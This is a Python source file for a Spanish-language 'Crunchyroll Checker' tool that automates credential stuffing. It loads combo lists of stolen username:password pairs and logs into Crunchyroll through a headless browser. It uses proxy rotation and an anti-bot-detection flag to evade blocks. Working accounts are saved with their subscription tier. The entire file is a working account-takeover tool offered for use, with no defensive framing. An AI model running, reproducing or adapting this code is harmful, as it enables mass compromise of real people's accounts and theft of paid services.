import os, sys, asyncio, platform, time, random, json
from playwright.async_api import async_playwright
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.align import Align

console = Console(highlight=False)

_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
_FOLDER = os.path.join(_BASE_DIR, "CrunchyChecker")
if not os.path.exists(_FOLDER): os.makedirs(_FOLDER)

_CFG_PATH = os.path.join(_FOLDER, ".crunchy_cfg.json")
_HITS_PATH = os.path.join(_FOLDER, "LIVE_Cuentas.txt")
_RESET_PATH = os.path.join(_FOLDER, "RESET_Cuentas.txt")
_PROGRESS_PATH = os.path.join(_FOLDER, ".progress.txt")

def _clear(): os.system('cls' if os.name == 'nt' else 'clear')
def _get_os_name():
    if "com.termux" in os.environ.get("PREFIX", ""): return "termux"
    if os.name == "nt": return "cmd" if "PS" not in os.environ.get("PROMPT", "") else "powershell"
    return platform.system().lower()
_OS_NAME = _get_os_name()

def load_cfg():
    if os.path.exists(_CFG_PATH):
        try: return json.load(open(_CFG_PATH))
        except: pass
    return {"delay": 15.0, "proxy_mode": "direct", "proxy_list": ""}

def save_cfg(cfg):
    with open(_CFG_PATH, "w") as f: json.dump(cfg, f, indent=2)

def _load_proxy_file(path):
    proxies = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    if "://" not in line: line = "http://" + line
                    proxies.append(line)
    except: pass
    return proxies

def draw_banner():
    ancho = console.width if console.width else 80
    ancho_panel = ancho if ancho < 80 else 80
    banner_texto = (
        "\n[bold #ff6600]██████╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗██╗   ██╗[/bold #ff6600]\n"
        "[bold #ff6600]██╔════╝██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║╚██╗ ██╔╝[/bold #ff6600]\n"
        "[bold #ffaa00]██║     ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║ ╚████╔╝ [/bold #ffaa00]\n"
        "[bold white]██║     ██╔══██╗██║   ██║██║╚██╗██║██║     ██╔══██║  ╚██╔╝  [/bold white]\n"
        "[bold white]╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║   ██║   [/bold white]\n"
        "[bold #ff6600] ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   [/bold #ff6600]\n"
        "[dim white]          Crunchyroll Checker By DarkoDevv v1.0[/dim white]"
    )
    console.print(Align.center(Panel(Align.center(banner_texto), border_style="#ff6600", box=box.ROUNDED, width=ancho_panel)))

def print_result(res, pos=""):
    st = res.get("status")
    u, p = res.get("username", ""), res.get("password", "")
    info = res.get("info", "")
    
    if st == "LIVE":
        print(f"\n{pos} \033[1;37;42m LIVE \033[0m \033[1;32m{u}:{p}\033[0m | \033[1;38;5;208m{info}\033[0m", flush=True)
    elif st == "RESET":
        print(f"\n{pos} \033[1;37;45m RESET \033[0m \033[1;35m{u}:{p}\033[0m | \033[1;38;5;208mCambiar Pass\033[0m", flush=True)
    else:
        print(f"\n{pos} \033[1;37;41m DEAD \033[0m \033[1;31m{u}:{p}\033[0m", flush=True)

async def check_crunchyroll(user, pw, browser, proxy_url=None, extra_info=""):
    context_args = {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "viewport": {"width": 1280, "height": 720}
    }
    if proxy_url:
        parts = proxy_url.replace("http://", "").split("@")
        if len(parts) == 2:
            auth, server = parts
            userp, passp = auth.split(":")
            context_args["proxy"] = {"server": f"http://{server}", "username": userp, "password": passp}
        else:
            context_args["proxy"] = {"server": proxy_url}

    context = await browser.new_context(**context_args)
    page = await context.new_page()
    
    try:
        await page.goto("https://www.crunchyroll.com/", timeout=60000)
        await page.wait_for_timeout(5000)
        
        await page.goto("https://www.crunchyroll.com/login", timeout=60000)
        await page.wait_for_timeout(3000)
        
        user_input = await page.wait_for_selector('input[type="text"], input[type="email"]', timeout=15000)
        await user_input.fill(user)
        
        pass_input = await page.wait_for_selector('input[type="password"]', timeout=5000)
        await pass_input.fill(pw)
        
        await page.click('button[type="submit"]')
        
        login_exitoso = False
        for _ in range(10):
            await page.wait_for_timeout(2000)
            current_url = page.url
            
            if "reset" in current_url or "forgot" in current_url:
                return {"status": "RESET", "username": user, "password": pw, "extra": extra_info}
                
            if "login" not in current_url:
                login_exitoso = True
                break
                
            try:
                btn = await page.query_selector('button[type="submit"]')
                if not btn:
                    login_exitoso = True
                    break
            except:
                pass

        if login_exitoso:
            content = (await page.content()).lower()
            info = "Cuenta Básica"
            if "premium" in content: info = "Cuenta Premium"
            if "mega fan" in content: info = "Mega Fan"
            return {"status": "LIVE", "username": user, "password": pw, "info": info, "extra": extra_info}
            
        return {"status": "DEAD", "username": user, "password": pw}
        
    except Exception:
        return {"status": "DEAD", "username": user, "password": pw}
    finally:
        await context.close()

async def run_single(cfg):
    _clear()
    draw_banner()
    print("\n\033[1;38;5;208mCheckeo Individual:\033[0m ", end="", flush=True)
    c = sys.stdin.readline().strip()
    print()
    
    if ":" not in c:
        print("\033[1;31mFormato inválido.\033[0m"); time.sleep(2); return
    u, p = c.split(":", 1)
    
    proxies = _load_proxy_file(cfg["proxy_list"]) if cfg["proxy_mode"] == "list" else []
    proxy = random.choice(proxies) if proxies else None
    
    print(f"\033[2mChequeando {u}...\033[0m")
    
    async with async_playwright() as pw_play:
        browser = await pw_play.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        res = await check_crunchyroll(u.strip(), p.strip(), browser, proxy, "")
        await browser.close()
        
    print_result(res, "")
    
    if res.get("status") == "LIVE":
        with open(_HITS_PATH, "a", encoding="utf-8") as f: f.write(f"{u}:{p} | {res.get('info')}\n")
    elif res.get("status") == "RESET":
        with open(_RESET_PATH, "a", encoding="utf-8") as f: f.write(f"{u}:{p}\n")
        
    print()
    input("Presiona Enter para volver...")

async def run_bulk(cfg):
    _clear()
    draw_banner()
    print("\n\033[1;38;5;208mArchivo de combos:\033[0m ", end="", flush=True)
    path = sys.stdin.readline().strip() or "accounts.txt"
    print()
    
    if not os.path.exists(path):
        print("\033[1;31mArchivo no encontrado.\033[0m"); time.sleep(2); return
    
    processed = set()
    if os.path.exists(_PROGRESS_PATH):
        with open(_PROGRESS_PATH, "r") as f: processed = set(line.strip() for line in f)
            
    accounts = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            head = line.split("|")[0].strip()
            if ":" in head:
                u, p = head.split(":", 1)
                c = f"{u.strip()}:{p.strip()}"
                if c not in processed:
                    meta = ""
                    if "|" in line:
                        meta = line.split("|", 1)[1].strip()
                    accounts.append((u.strip(), p.strip(), meta))
    
    if not accounts:
        print("\033[1;32mTodas las cuentas ya fueron chequeadas.\033[0m"); time.sleep(2); return

    proxies = _load_proxy_file(cfg["proxy_list"]) if cfg["proxy_mode"] == "list" else []

    _clear()
    draw_banner()
    print(f"\n\033[1;38;5;208m▶ Iniciando Mass Check:\033[0m {len(accounts)} pendientes\n")

    async with async_playwright() as pw_play:
        browser = await pw_play.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        
        with open(_PROGRESS_PATH, "a") as pf:
            for i, (u, p, meta) in enumerate(accounts, 1):
                proxy = random.choice(proxies) if proxies else None
                print(f"\033[2m[{i}/{len(accounts)}] Chequeando {u}...\033[0m", end="\r", flush=True)
                res = await check_crunchyroll(u, p, browser, proxy, meta)
                pf.write(f"{u}:{p}\n"); pf.flush()
                
                print(" " * 60, end="\r")
                print_result(res, f"\033[2m{i}/{len(accounts)}\033[0m")
                
                if res.get("status") == "LIVE":
                    with open(_HITS_PATH, "a", encoding="utf-8") as f: f.write(f"{u}:{p} | {res.get('info')} | {res.get('extra')}\n")
                elif res.get("status") == "RESET":
                    with open(_RESET_PATH, "a", encoding="utf-8") as f: f.write(f"{u}:{p} | {res.get('extra')}\n")
                
                if i < len(accounts):
                    time.sleep(cfg["delay"])
        
        await browser.close()
    
    print("\n\033[1;38;5;208m■ Completado.\033[0m")
    input("Presiona Enter para volver...")

async def menu():
    cfg = load_cfg()
    while True:
        _clear()
        draw_banner()

        stat = Table(show_header=False, box=None)
        stat.add_column(style="#ff6600", justify="right")
        stat.add_column(style="white", justify="left")
        stat.add_row("Delay: ", f"{cfg['delay']}s")
        stat.add_row("Proxies: ", f"{cfg['proxy_mode']} ({cfg.get('proxy_list', 'N/A')})")
        console.print(Align.center(stat))

        print("\n\033[1;38;5;208m1.\033[0m Mass Check (Lote)")
        print("\033[1;38;5;208m2.\033[0m Check Single Account")
        print("\033[1;38;5;208m3.\033[0m Configuración")
        print("\033[1;38;5;208m0.\033[0m Salir\n")

        print("\033[1;38;5;208m┌──\033[0m(\033[1;38;5;208mCrunchyChecker\033[0m㉿\033[1;38;5;208m" + _OS_NAME + "\033[0m)")
        print("\033[1;38;5;208m└─\033[0m\033[1;37m$\033[0m ", end="", flush=True)
        choice = sys.stdin.readline().strip()
        print("\033[F\033[K", end="", flush=True)

        if choice == "0":
            _clear()
            draw_banner()
            print("\n\033[1;37mHasta luego, espero que vuelvas 👋🏻\033[0m\n")
            break
        elif choice == "1":
            await run_bulk(cfg)
        elif choice == "2":
            await run_single(cfg)
        elif choice == "3":
            _clear()
            draw_banner()
            print("\n\033[1;38;5;208mConfiguración\033[0m")
            print(f"1. Delay en seg (Actual: {cfg['delay']}s)")
            print(f"2. Ruta de proxies.txt (Actual: {cfg.get('proxy_list', 'Ninguno')})")
            print("0. Volver\n")
            print("\033[1;38;5;208mOpción:\033[0m ", end="", flush=True)
            sub = sys.stdin.readline().strip()
            print()
            if sub == "1": cfg["delay"] = float(input("Nuevo Delay > "))
            elif sub == "2":
                p = input("Ruta del archivo txt > ").strip()
                cfg["proxy_list"] = p
                cfg["proxy_mode"] = "list" if p else "direct"
            save_cfg(cfg)

if __name__ == "__main__":
    asyncio.run(menu())
